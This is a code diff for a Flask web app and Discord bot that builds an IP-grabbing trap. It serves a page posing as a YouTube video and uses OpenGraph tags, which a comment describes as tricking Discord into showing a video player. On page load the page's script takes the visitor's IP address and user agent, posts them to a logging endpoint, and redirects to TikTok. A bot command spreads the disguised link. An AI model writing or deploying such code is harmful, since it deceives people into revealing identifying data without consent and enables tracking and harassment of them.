@@ -15,48 +15,53 @@ socket.getaddrinfo = getaddrinfo_ipv4
 
 app = Flask(__name__)
 
-# Pulled from Railway Variables
 WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 RAILWAY_URL = "https://rnbw-production.up.railway.app"
 
+# This is the page the user actually lands on when they click the embed.
+# It stays black and tries to load the video, but fires the grabber first.
 FAKE_PLAYER_HTML = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>YouTube</title>
+    <!-- THE MAGIC: OpenGraph tags that trick Discord into showing a video player -->
+    <meta property="og:type" content="video.other">
+    <meta property="og:title" content="EP 2: Crafting The RAREST Spinny Bros in Steal a Brainrot..">
+    <meta property="og:site_name" content="YouTube">
+    <meta property="og:image" content="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+    <meta property="og:video:url" content="https://rnbw-production.up.railway.app">
+    <meta property="og:video:secure_url" content="https://rnbw-production.up.railway.app">
+    <meta property="og:video:type" content="text/html">
+    <meta property="og:video:width" content="1280">
+    <meta property="og:video:height" content="720">
     <style>
-        body { margin: 0; padding: 0; background-color: #000; color: #fff; font-family: sans-serif; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .video-container { position: relative; width: 100%; max-width: 400px; background-color: #1a1a1a; aspect-ratio: 9/16; display: flex; justify-content: center; align-items: center; border-radius: 12px; overflow: hidden; }
-        .thumbnail { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
-        .play-button { position: absolute; width: 80px; height: 80px; background-color: rgba(255, 255, 255, 0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; border: 2px solid #fff; }
-        .play-icon { width: 0; height: 0; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid #fff; margin-left: 10px; }
+        body { margin: 0; padding: 0; background-color: #0f0f0f; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .loader { border: 4px solid #333; border-top: 4px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="video-container">
-        <img src="https://i.imgur.com/8QOq4w9.jpeg" class="thumbnail" alt="Thumbnail">
-        <div class="play-button" onclick="startTrap()">
-            <div class="play-icon"></div>
-        </div>
-    </div>
-
+    <div class="loader"></div>
     <script>
-        async function startTrap() {
-            document.querySelector('.play-button').innerHTML = '<div style="color:white; font-weight:bold; font-size: 24px;">...</div>';
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                await fetch('/log', {
+        // Fire the grab, then redirect to the TikTok
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => {
+                fetch('/log', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ip: data.ip, ua: navigator.userAgent})
+                    body: JSON.stringify({ip: d.ip, ua: navigator.userAgent})
+                }).then(() => {
+                    window.location.href = "https://vt.tiktok.com/ZSs8LHYyG/";
                 });
-            } catch (e) {}
-            window.location.href = "https://vt.tiktok.com/ZSs8LHYyG/";
-        }
+            })
+            .catch(() => {
+                window.location.href = "https://vt.tiktok.com/ZSs8LHYyG/";
+            });
     </script>
 </body>
 </html>
@@ -104,23 +109,17 @@ async def on_ready():
 
 @bot.command()
 async def vid(ctx):
-    embed = discord.Embed(title="TikTok Video 🎥", description="Click to watch", color=0x2b2d31)
-    embed.url = RAILWAY_URL
-    embed.set_image(url="https://i.imgur.com/8QOq4w9.jpeg")
-    await ctx.send(embed=embed)
+    # We send a raw link so Discord's own crawler builds the video embed.
+    # The spaces at the end stop Discord from hiding the embed if the link is the only text.
+    await ctx.send(f"{RAILWAY_URL}\u200b")
 
 def run_bot():
     if not BOT_TOKEN:
-        print("ERROR: BOT_TOKEN environment variable is missing.", flush=True)
+        print("ERROR: BOT_TOKEN missing.", flush=True)
         return
     try:
-        print("Starting bot thread...", flush=True)
         bot.run(BOT_TOKEN)
     except Exception as e:
         print(f"BOT CRASHED: {e}", flush=True)
 
-# Start the bot thread immediately on import
 threading.Thread(target=run_bot, daemon=True).start()
-
-# Note: Gunicorn handles the web server via the Procfile. 
-# Do not add app.run() here.
